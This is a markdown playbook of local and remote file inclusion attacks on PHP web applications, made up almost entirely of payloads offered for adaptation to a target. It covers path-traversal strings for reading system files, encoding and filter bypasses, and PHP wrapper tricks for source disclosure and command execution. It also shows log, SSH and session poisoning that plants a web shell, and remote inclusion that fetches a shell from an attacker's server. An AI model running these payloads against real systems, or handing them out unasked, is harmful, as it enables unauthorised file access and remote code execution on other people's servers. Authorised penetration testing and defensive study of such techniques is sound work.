## LFI/RFI (File Inclusion) Attack Playbook

> **IMPORTANT:** All payloads in this playbook are EXAMPLES that must be MODIFIED for your specific target. Replace placeholders like `{TARGET_FILE}`, `{FILE_PATH}`, `{DEPTH}`, `{ATTACKER_URL}` with actual values. Adapt payloads based on:
> - Target operating system (Linux, Windows, etc.)
> - Web server and framework
> - File paths and directory structure
> - PHP wrapper availability and filtering

### LFI vs Path Traversal

- **Path Traversal:** Read arbitrary files (no code execution)
- **File Inclusion:** Include files that get executed by the interpreter (potential RCE)

### Basic LFI Payloads

**Standard traversal (adjust depth based on application path):**
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..\/..\/..\/etc/passwd
```

### Null Byte Bypass

For PHP < 5.3.4 when extension is appended:
```
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.php
```

### Double Encoding Bypass

When filter decodes once but backend decodes again:
```
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Overlong Encoding

```
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Path Truncation

PHP truncates at 4096 bytes:
```
?page=../../../etc/passwd............[ADD MORE DOTS TO 4096+]
?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
?page=../../../etc/passwd/./././././.[ADD MORE]
```

### Filter Bypass Patterns

**When ../ is stripped (recursive bypass):**
```
?page=....//....//etc/passwd
?page=..///////..////..//////etc/passwd
?page=....\/....\/....\/etc/passwd
```

**Backslash variations:**
```
?page=/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### PHP Wrapper Exploitation

**php://filter - Read source code:**
```
?page=php://filter/convert.base64-encode/resource={TARGET_FILE}
?page=php://filter/read=string.rot13/resource={TARGET_FILE}
?page=php://filter/zlib.deflate/convert.base64-encode/resource={TARGET_FILE}
```

**php://input - Code execution (POST body):**
```bash
curl -X POST --data "<?php system('id'); ?>" "{URL}?page=php://input%00"
```

**data:// - Inline code execution:**
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# Base64 of: <?php system($_GET['cmd']);?>
```

**expect:// - Direct command execution:**
```
?page=expect://id
?page=expect://whoami
```

**zip:// - Include from ZIP archive:**
```
?page=zip://uploads/shell.jpg%23payload.php
```

**phar:// - Include from PHAR archive:**
```
?page=phar:///var/www/html/archive.phar/test.txt
```

### LFI to RCE Techniques

**Via /proc/self/environ (inject in User-Agent):**
```
GET ?page=../../../proc/self/environ HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Via log poisoning (Apache/Nginx):**
```bash
# Poison access log with User-Agent
curl "{TARGET}" -A "<?php system(\$_GET['cmd']);?>"

# Include log file
?page=/var/log/apache2/access.log&cmd=id
?page=/var/log/nginx/access.log&cmd=id
```

**Common log paths:**
```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/error_log
/var/log/sshd.log
/var/log/mail
```

**Via SSH log poisoning:**
```bash
ssh '<?php system($_GET["cmd"]);?>'@{TARGET}
# Then include /var/log/auth.log
```

**Via PHP sessions:**
```
# Set session data with payload
?login=1&user=<?php system("id");?>

# Include session file
?page=/var/lib/php5/sess_{PHPSESSID}
?page=/var/lib/php/sessions/sess_{PHPSESSID}
```

**Via PHP PEARCMD (Docker PHP images):**
```
?page=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?=system($_GET['c'])?>+/tmp/shell.php
# Then include /tmp/shell.php
```

**Via /proc/*/fd (file descriptor bruteforce):**
```
?page=/proc/{PID}/fd/{FD}
# Bruteforce PID and FD values
```

**Via iconv CVE-2024-2961 (PHP 7.0-8.3.7):**
Requires convert.iconv filter and can achieve RCE.

### Remote File Inclusion (RFI)

Requires `allow_url_include = On` (disabled by default since PHP 5).

**Basic RFI:**
```
?page=http://{YOUR_SERVER}/shell.txt
?page=http://{YOUR_SERVER}/shell.txt%00
```

**SMB bypass (Windows, when HTTP blocked):**
```
?page=\\{YOUR_SERVER}\share\shell.php
```

